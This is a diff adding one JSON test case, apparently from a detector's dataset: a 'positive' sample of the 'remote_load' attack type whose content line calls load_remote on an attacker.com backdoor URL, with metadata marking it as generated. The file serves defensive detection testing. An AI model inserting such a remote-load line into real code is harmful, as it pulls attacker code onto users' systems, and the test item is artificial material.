@@ -1,0 +1,14 @@
+{
+  "test_case_id": "RL_POS_019",
+  "attack_type": "remote_load",
+  "sample_type": "positive",
+  "content": "# Attack sample: remote_load variant 19\nload_remote('http://attacker.com/backdoor')\n",
+  "content_hash": "ec67da9be681a8e1",
+  "expected_result": true,
+  "metadata": {
+    "variant": "polymorphic",
+    "difficulty": "hard",
+    "created_at": "2026-03-19T07:37:00.582373",
+    "generator_version": "1.0.0"
+  }
+}
